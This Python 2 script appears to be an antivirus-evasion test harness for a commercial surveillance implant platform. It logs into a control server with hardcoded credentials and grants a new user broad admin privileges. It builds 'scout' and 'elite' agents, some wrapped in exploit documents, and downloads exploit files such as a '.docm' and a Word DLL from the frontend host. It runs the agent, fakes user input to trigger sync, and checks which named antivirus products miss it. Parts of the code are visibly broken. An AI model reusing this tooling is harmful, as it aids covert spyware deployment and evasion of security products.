import os
import shutil
from time import sleep
import time
import socket
import urllib2
import zipfile
import os.path
import re
import traceback
import subprocess
import Queue
import threading
import argparse
import random
from ConfigParser import ConfigParser
from urllib2 import HTTPError
import ctypes

from rcs_client import Rcs_client
import logging
import redis

MOUSEEVENTF_MOVE = 0x0001  # mouse move
MOUSEEVENTF_ABSOLUTE = 0x8000  # absolute move
MOUSEEVENTF_MOVEABS = MOUSEEVENTF_MOVE + MOUSEEVENTF_ABSOLUTE

MOUSEEVENTF_LEFTDOWN = 0x0002  # left button down
MOUSEEVENTF_LEFTUP = 0x0004  # left button up
MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP


def unzip(filename, fdir):
    zfile = zipfile.ZipFile(filename)
    names = []
    for name in zfile.namelist():
        (dirname, filename) = os.path.split(name)
        logging.debug("- Decompress: %s / %s" % (fdir, filename))
        zfile.extract(name, fdir)
        names.append('%s/%s' % (fdir, name))
    return names


def check_internet(address, queue):
    """ True if dns or http are reachable """
    logging.debug("- Check connection: %s" % address)

    ret = False
    # try:
    # if hasattr(socket, 'setdefaulttimeout'):
    # socket.setdefaulttimeout(5)
    #     response = socket.gethostbyaddr( address )
    # logging.debug("i resolve dns: ", address)
    #     ret |= True
    # except:
    #     ret |= False

    try:
        if(ret is False):
            response = urllib2.urlopen('http://' + address, timeout=10)
            # logging.debug("i reach url: ", address)
            ret |= True
    except:
        ret |= False

    queue.put(ret)


def internet_on():
    ips = ['87.248.112.181', '173.194.35.176', '176.32.98.166',
           'www.reddit.com', 'www.bing.com', 'www.facebook.com', 'stackoverflow.com']
    q = Queue.Queue()
    for i in ips:
        t = threading.Thread(target=check_internet, args=(i, q))
        t.daemon = True
        t.start()

    s = [q.get() for i in ips]
    return any(s)


def wait_timeout(proc, seconds):
    """Wait for a process to finish, or raise exception after timeout"""
    start = time.time()
    end = start + seconds
    interval = min(seconds / 1000.0, .25)

    logging.debug("DBG wait for: %s sec" % seconds)
    while True:
        result = proc.poll()
        if result is not None:
            return result
        if time.time() >= end:
            proc.kill()
            logging.debug("DBG Process timed out, killed")
            break
        time.sleep(interval)


class connection:
    host = ""
    user = "avmonitor"
    passwd = "avmonitorp123"


    def __enter__(self):
        logging.debug("DBG login %s@%s" % (self.user, self.host))
        assert connection.host
        self.conn = Rcs_client(connection.host, connection.user, connection.passwd)
        self.conn.login()
        return self.conn

    def __exit__(self, type, value, traceback):
        logging.debug("DBG logout")
        self.conn.logout()


class AgentBuild:

    def __init__(self, backend, frontend=None, platform='windows', kind='silent',
                 ftype='desktop', blacklist=[], param = None):
        self.kind = kind
        self.host = (backend, frontend)
        if "winxp" in socket.gethostname():
            self.hostname = socket.gethostname().replace("winxp", "")
        elif "win7" in socket.gethostname():
            self.hostname = socket.gethostname().replace("win7", "")
        else:
            self.hostname = socket.gethostname().replace("win8", "")
#        self.hostname = socket.gethostname()
        self.blacklist = blacklist
        self.platform = platform
        self.ftype = ftype
        self.param = param
        logging.debug("DBG blacklist: %s" % self.blacklist)
        logging.debug("DBG hostname: %s" % self.hostname)

    def _delete_targets(self, operation):
        with connection() as c:
            operation_id, group_id = c.operation(operation)
            logging.debug("operation_id: %s" % operation_id)
            targets = c.targets(operation_id)
            for t_id in targets:
                logging.debug("- Delete target: %s" % t_id)
                c.target_delete(t_id)

    def _create_new_factory(self, operation, target, factory, config):
        with connection() as c:
            assert c
            if not c.logged_in():
                logging.warn("Not logged in")
            logging.debug("DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)

            operation_id, group_id = c.operation(operation)
            if not operation_id:
                raise RuntimeError("Cannot get operations")

            # gets all the target with our name in an operation
            targets = c.targets(operation_id, target)

            if len(targets) > 0:
                # keep only one target
                for t in targets[1:]:
                    c.target_delete(t)

                target_id = targets[0]

                agents = c.agents(target_id)

                for agent_id, ident, name in agents:
                    logging.debug("DBG   ", agent_id, ident, name)
                    if name.startswith(factory):
                        logging.debug("- Delete instance: %s %s" % (ident, name))
                        c.instance_delete(agent_id)
            else:
                logging.debug("- Create target: %s" % target)
                target_id = c.target_create(
                    operation_id, target, 'made by vmavtest at %s' % time.ctime())
            factory_id, ident = c.factory_create(
                operation_id, target_id, self.ftype, factory,
                'made by vmavtestat at %s' % time.ctime()
            )

            with open(config) as f:
                conf = f.read()

            conf = re.sub(
                r'"host": ".*"', r'"host": "%s"' % self.host[1], conf)
            c.factory_add_config(factory_id, conf)

            with open('build/config.actual.json', 'wb') as f:
                f.write(conf)

            return (target, factory_id, ident)

    def _build_agent(self, factory, melt=None, demo=False, tries=0):
        with connection() as c:

            try:
                # TODO: togliere da qui, metterla in procedures
                filename = 'build/%s/build.zip' % self.platform
                if os.path.exists(filename):
                    os.remove(filename)

                if melt:
                    logging.debug("- Melt build with: ", melt)
                    appname = "exp_%s" % self.hostname
                    self.param['melt']['appname'] = appname
                    self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                    if 'deliver' in self.param:
                        self.param['deliver']['user'] = c.myid
                    r = c.build_melt(factory, self.param, melt, filename)
                else:
                    logging.debug("- Silent build")
                    r = c.build(factory, self.param, filename)

                contentnames = unzip(filename, "build/%s" % self.platform)

                # CHECK FOR DELETED FILES

                for content in contentnames:
                    dst = content.split("/")

                    src_dir = "C:\\Users\\avtest\\Desktop\\AVTEST"
                    dst_dir = "C:\\Users\\avtest\\Desktop\\AVTEST\\copy"

                    for i in range(0, (len(dst) - 1)):
                        src_dir += "\\%s" % dst[i]
                        dst_dir += "\\%s" % dst[i]

                    if not os.path.exists(dst_dir):
                        os.makedirs(dst_dir)

                    src_exe = "%s\\%s" % (src_dir, dst[-1])
                    if "exe" not in src_exe or "bat" not in src_exe or "dll" not in src_exe:
                        dst_exe = "%s\\%s.exe" % (dst_dir, dst[-1])
                    else:
                        dst_exe = "%s\\%s" % (dst_dir, dst[-1])

                    logging.debug("Copying %s to %s" % (src_exe, dst_exe))
                    try:
                        shutil.copy(src_exe, dst_exe)

                        if os.path.exists(dst_exe) and os.path.exists(src_exe):
                            logging.debug("+ SUCCESS SCOUT BUILD")
                            return [n for n in contentnames if n.endswith('.exe')]
                        else:
                            logging.debug("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % src_exe)
                            send_results("ENDED")
                    except:
                        logging.debug("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % src_exe)
                        send_results("ENDED")
                        return
            except HTTPError as err:
                logging.debug("DBG trace %s" % traceback.format_exc())
                if tries <= 3:
                    tries += 1
                    logging.debug("DBG problem building scout. tries number %s" % tries)
                    return self._build_agent(factory, melt, demo, tries)
                else:
                    logging.debug("+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries)
                    raise err
            except Exception, e:
                logging.debug("DBG trace %s" % traceback.format_exc())
                logging.debug("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")
                send_results("ENDED")
                raise e

    def _execute_build(self, exenames):
        try:
            exe = exenames[0]
            if exe == "build/agent.exe":
                new_exe = "build/SNZEHJJG.exe"
                os.rename(exe, new_exe)
                exe = new_exe

            logging.debug("- Execute: " + exe)
            subp = subprocess.Popen([exe])
            logging.debug("+ SUCCESS SCOUT EXECUTE")
        except Exception, e:
            logging.debug("DBG trace %s" % traceback.format_exc())
            logging.debug("+ FAILED SCOUT EXECUTE")
            send_results("ENDED")
            raise e

    def _click_mouse(self, x, y):
            # move first
        x = 65536L * x / ctypes.windll.user32.GetSystemMetrics(0) + 1
        y = 65536L * y / ctypes.windll.user32.GetSystemMetrics(1) + 1
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_MOVEABS, x, y, 0, 0)
        # then click
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_CLICK, 0, 0, 0, 0)

    def _trigger_sync(self, timeout=10):
        subp = subprocess.Popen(['assets/keyinject.exe'])
        wait_timeout(subp, timeout)

    def _check_instance(self, ident):
        with connection() as c:
            instances = c.instances(ident)
            logging.debug("DBG instances: %s" % instances)

            assert len(instances) <= 1, "too many instances"

            if len(instances) > 0:
                logging.debug("+ SUCCESS SCOUT SYNC")
                return instances[0]

            logging.debug("+ NO SCOUT SYNC")
            # self._send_results("ENDED")
            return None

    def _check_elite(self, instance_id):
        with connection() as c:
            info = c.instance_info(instance_id)
            logging.debug('DBG _check_elite %s' % info)
            ret = info['upgradable'] is False and info['scout'] is False

            if ret:
                logging.debug("+ SUCCESS ELITE SYNC")
            else:
                logging.debug("+ FAILED ELITE SYNC")
                send_results("ENDED")
            return ret

    def _uninstall(self, instance_id):
        with connection() as c:
            c.instance_close(instance_id)

    def _upgrade_elite(self, instance_id):
        with connection() as c:
            ret = c.instance_upgrade(instance_id)
            logging.debug("DBG _upgrade_elite: %s" % ret)
            info = c.instance_info(instance_id)
            if ret:
                #assert info['upgradable'] == True
                assert info['scout'] is True
            else:
                #assert info['upgradable'] == False
                assert info['scout'] is True
            return ret

    def _list_processes(self):
        return subprocess.Popen(["tasklist"], stdout=subprocess.PIPE).communicate()[0]

    def server_errors(self):
        with connection() as c:
            return c.server_status()['error']

    def create_user_machine(self):
        logging.debug("create_user_machine")
        privs = [
            'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT',
            'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP',
            'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
            'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD',
            'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM',
            'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
        user_name = "avmonitor_%s" % self.hostname
        connection.user = user_name

        user_exists = False
        try:
            with connection() as c:
                logging.debug("LOGIN SUCCESS")
                user_exists = True
        except:
            pass

        if not user_exists:
            connection.user = "avmonitor"
            with connection() as c:
                ret = c.operation('AVMonitor')
                op_id, group_id = ret
                c.user_create(user_name, connection.passwd, privs, group_id)
        connection.user = user_name
        return True

    def execute_elite(self):
        """ build scout and upgrade it to elite """
        instance = self.execute_scout()

        if not instance:
            logging.debug("- exiting execute_elite because did't sync")
            send_results("ENDED")
            return

        logging.debug("- Try upgrade to elite")
        upgradable = self._upgrade_elite(instance)

        logging.debug("DBG %s in %s" % (self.hostname, self.blacklist))
        if not upgradable:
            if self.hostname in self.blacklist:
                result = "+ SUCCESS ELITE BLACKLISTED"
                logging.debug(result)
            else:
                result = "+ FAILED ELITE UPGRADE"
                logging.debug(result)
            send_results("ENDED")
            return
        else:
            if self.hostname in self.blacklist:
                result = "+ FAILED ELITE BLACKLISTED"
                logging.debug(result)
                send_results("ENDED")
                return

        logging.debug("- Elite, Wait for 25 minutes: %s" % time.ctime())
        sleep(25 * 60)

        elite = self._check_elite(instance)
        if elite:
            result = "+ SUCCESS ELITE INSTALL"
            logging.debug(result)
            logging.debug("- Elite, wait for 4 minute then uninstall: %s" % time.ctime())
            sleep(60 * 2)
            self._uninstall(instance)
            sleep(60 * 2)
            result = "+ SUCCESS ELITE UNINSTALLED"
            logging.debug(result)
        else:
            output = self._list_processes()
            logging.debug(output)
            result = "+ FAILED ELITE INSTALL"
            logging.debug(result)

        logging.debug("- Result: %s" % elite)
        logging.debug("- sending Results to Master")
        send_results("ENDED")

    def execute_scout(self):
        """ build and execute the  """
        factory_id, ident, exe = self.execute_pull()

        self._execute_build(exe)

        logging.debug("- Scout, Wait for 6 minutes: %s" % time.ctime())
        sleep(random.randint(300, 400))

        for tries in range(1, 10):
            logging.debug("- Scout, Trigger sync for 30 seconds, try %s" % tries)
            self._trigger_sync(timeout=30)

            logging.debug("- Scout, wait for 1 minute: %s" % time.ctime())
            sleep(60 * 1)

            instance = self._check_instance(ident)
            if instance:
                break

            for i in range(10):
                self._click_mouse(100 + i, 0)

        if not instance:
            logging.debug("+ FAILED SCOUT SYNC")
            output = self._list_processes()
            logging.debug(output)
            send_results("ENDED")
        logging.debug("- Result: %s" % instance)
        return instance

    def execute_pull(self):
        """ build and execute the  """

        logging.debug("- Host: %s %s\n" % (self.hostname, time.ctime()))
        operation = 'AVMonitor'
        target = 'VM_%s' % self.hostname
        # desktop_exploit_melt, desktop_scout_
        factory = '%s_%s_%s_%s' % (
            self.hostname, self.ftype, self.platform, self.kind)
        config = "assets/config_%s.json" % self.ftype

        if not os.path.exists('build'):
            os.mkdir('build')
        if not os.path.exists('build/%s' % self.platform):
            os.mkdir('build/%s' % self.platform)
        target_id, factory_id, ident = self._create_new_factory(
            operation, target, factory, config)

        logging.debug("- Built")

#        logging.debug("+ platfoooorm %s" % self.platform)
#        logging.debug("+ kiiiiiiiind %s" % self.kind)

        meltfile = None
        if self.kind == 'melt':
            if self.platform == 'exploit_docx':
                meltfile = 'assets/meltexploit.docx'
            elif self.platform == 'exploit_ppsx':
                meltfile = 'assets/meltexploit.ppsx'
            elif self.platform == 'exploit':
                meltfile = 'assets/meltexploit.txt'
            else:
                meltfile = 'assets/meltapp.exe'

        exe = self._build_agent(factory_id, meltfile)

        if self.kind == "silent" and self.platform == "windows":
            try:
                logging.debug("Check for codec/sqlite files detection")
                src_dir = "C:\\Users\\avtest\\Desktop\\AVTEST"
                dst_dir = "C:\\Users\\avtest\\Desktop\\AVTEST\\copy"

                if not os.path.exists(dst_dir):
                    os.makedirs(dst_dir)

                logging.debug("DBG copying assets codec and sqlite")

                shutil.copy("%s\\assets\\sqlite" %
                            src_dir, "%s\\sqlite.exe" % dst_dir)
                shutil.copy("%s\\assets\\sqlite_mod" %
                            src_dir, "%s\\sqlite_mod.exe" % dst_dir)

                shutil.copy("%s\\assets\\codec" %
                            src_dir, "%s\\codec.exe" % dst_dir)
                shutil.copy("%s\\assets\\codec_mod" %
                            src_dir, "%s\\codec_mod.exe" % dst_dir)

                logging.debug("+ SUCCESS CODEC/SQLITE SAVE")
            except IOError:
                logging.debug("+ FAILED CODEC/SQLITE SAVE")
                send_results("ENDED")
                return
#                pass

        if "exploit_" in self.platform:
            if self.platform == 'exploit_docx':
                appname = "exp_%s/avtest.swf" % self.hostname
            elif self.platform == 'exploit_ppsx':
                appname = "pexp_%s/avtest.swf" % self.hostname
            elif self.platform == 'exploit_web':
                dllname = "exp_%s/PMIEFuck-WinWord.dll" % self.hostname
                docname = "exp_%s/owned.docm" % self.hostname

            url = "http://%s/%s" % (self.host[1], appname)
            logging.debug("DBG getting: %s" % url)
            done = False
            try:
                u = urllib2.urlopen(url)
                localFile = open('build/file.swf', 'w')
                localFile.write(u.read())
                localFile.close()
                sleep(2)
                with open('build/file.swf'):
                    done = True
                if "exploit_web" in self.platform:
                    url = "http://%s/%s" % (self.host[1], docname)
                    u = urllib2.urlopen(url)
                    docFile = open('build/owned.docm', 'w')
                    docFile.write(u.read())
                    docFile.close()
                    sleep(2)
                    with open('build/owned.docm'):
                        done = True
                    url = "http://%s/%s" % (self.host[1], dllname)
                    u = urllib2.urlopen(url)
                    docFile = open('build/PMIEFuck-WinWord.dll', 'w')
                    docFile.write(u.read())
                    docFile.close()
                    sleep(2)
                    with open('build/PMIEFuck-WinWord.dll'):
                        done = True
                if done == True:
                    logging.debug("+ SUCCESS EXPLOIT SAVE")
            except urllib2.HTTPError:
                logging.debug("+ ERROR EXPLOIT DOWNLOAD")
                pass
            except IOError:
                logging.debug("+ FAILED EXPLOIT SAVE")
                pass

        return factory_id, ident, exe

    def execute_web_expl(self, websrv):
        """ WEBZ: we need to download some files only """
        def check_file(filename):
            try:
                with open(filename):
                    logging.debug("DBG %s saved")
                    return True
            except IOError:
                logging.debug("DBG failed saving %s" % appname)
                return False

        appname = ""
        done = True
        filez = ["assets/avtest.swf", "assets/owned.docm",
                 "assets/PMIEFuck-WinWord.dll"]

        for appname in filez:
            if check_file(appname) is False:
                done = False
                break
        if done is True:
                logging.debug("+ SUCCESS EXPLOIT SAVE")
        else:
            logging.debug("+ FAILED EXPLOIT SAVE")


def send_results(results):
    #TODO
    pass

internet_checked = False

# args: platform_type, backend, frontend, kind, blacklist
def execute_agent(args, level, platform):
    """ starts the vm and execute elite,scout or pull, depending on the level """
    global internet_checked

    # ftype can be desktop or mobile
    ftype = args.platform_type[platform]
    logging.debug("DBG ftype: %s" % ftype)

    vmavtest = AgentBuild(args.backend, args.frontend,
                       platform, args.kind, ftype, args.blacklist, args.param)

    """ starts a scout """
    if socket.gethostname() not in ['Zanzara.local', 'win7zenoav', "paradox"]:
        if not internet_checked and internet_on():
            logging.debug("+ ERROR: I reach Internet")
            send_results("ENDED")
            return False

    internet_checked = True
    logging.debug("- Network unreachable")
    logging.debug("- Server: %s/%s %s" % (args.backend, args.frontend, args.kind))

    if platform == "exploit_web":
        vmavtest.execute_web_expl(args.frontend)
    else:
        if vmavtest.create_user_machine():
            logging.debug("+ SUCCESS USER CONNECT")
            if not vmavtest.server_errors():
                logging.debug("+ SUCCESS SERVER CONNECT")
                action = {"elite": vmavtest.execute_elite, "scout":
                          vmavtest.execute_scout, "pull": vmavtest.execute_pull}
                sleep(5)
                action[level]()

            else:
                logging.debug("+ ERROR SERVER ERRORS")
                return False
        else:
            logging.debug("+ ERROR USER CREATE")
            return False

    return True


def elite(args):
    """ starts a elite """
    execute_agent(args, "elite", args.platform)
    send_results("ENDED")


def scout(args):
    """ starts a scout """
    execute_agent(args, "scout", args.platform)
    send_results("ENDED")


def pull(args):
    """ deploys one or all platforms
    ('windows', 'linux', 'osx', 'exploit', 'exploit_docx', 'android', 'blackberry', 'ios') """
    if args.platform == "all":
        for platform in args.platform_type.keys():
            if platform.startswith("exploit"):
                continue
            logging.debug("pulling platform ", platform)
            try:
                execute_agent(args, "pull", platform)
                logging.debug("+ SUCCESS PULL %s" % platform)
            except Exception, ex:
                logging.debug("ERROR %s" % ex)
                pass
    else:
        execute_agent(args, "pull", args.platform)
    send_results("ENDED")


def test(args):
    connection.host = "rcs-minotauro"
    #ret = unzip('build/agent.zip')
    # logging.debug(ret)
    output = subprocess.Popen(
        ["tasklist"], stdout=subprocess.PIPE).communicate()[0]
    logging.debug(output)


def internet(args):
    logging.debug(time.ctime())
    logging.debug("internet on: ", internet_on())
    logging.debug(time.ctime())


def clean(args):
    operation = 'AVMonitor'
    logging.debug("- Server: %s/%s %s" % (args.backend, args.frontend, args.kind))
    vmavtest = AgentBuild(args.backend, args.frontend, args.kind)
    vmavtest._delete_targets(operation)

def build(action, platform, kind, backend, frontend, params):

    platform_desktop = ['windows', 'linux', 'osx', 'exploit',
                        'exploit_docx', 'exploit_ppsx', 'exploit_web']
    platform_mobile = ['android', 'blackberry', 'ios']
    blacklist = "bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32".split(',')

    platform_type = {}
    """ can be desktop or mobile """
    for v in platform_desktop:
        platform_type[v] = 'desktop'
    for v in platform_mobile:
        platform_type[v] = 'mobile'


    actions = {'scout': scout, 'elite': elite, 'internet':
               internet, 'test': test, 'clean': clean, 'pull': pull}

    class Args:
        pass

    args = Args()

    args.action = action
    args.platform = platform
    args.kind = kind
    args.backend = backend
    args.frontend = frontend
    args.params = params

    args.blacklist=blacklist
    args.platform_type=platform_type

    connection.host = args.backend

    actions[action](args)

def main():

    parser = argparse.ArgumentParser(description='AVMonitor avtest.')

    #'elite'
    parser.add_argument(
        'action', choices=['scout', 'elite', 'internet', 'test', 'clean', 'pull'])
    parser.add_argument('-p', '--platform', default='windows')
    parser.add_argument('-b', '--backend')
    parser.add_argument('-f', '--frontend')
    parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
    parser.add_argument(
        '-v', '--verbose', action='store_true', default=False, help="Verbose")

    #parser.set_defaults(blacklist=blacklist)
    #parser.set_defaults(platform_type=platform_type)

    args = parser.parse_args()
    if "winxp" in socket.gethostname():
        avname = socket.gethostname().replace("winxp", "").lower()
    elif "win7" in socket.gethostname():
        avname = socket.gethostname().replace("win7", "").lower()
    else:
        avname = socket.gethostname().replace("win8", "").lower()

    build(args.action, args.platform, args.kind, args.backend, args.frontend)

if __name__ == "__main__":
    import logging.config
    logging.config.fileConfig('../logging.conf')
    main()
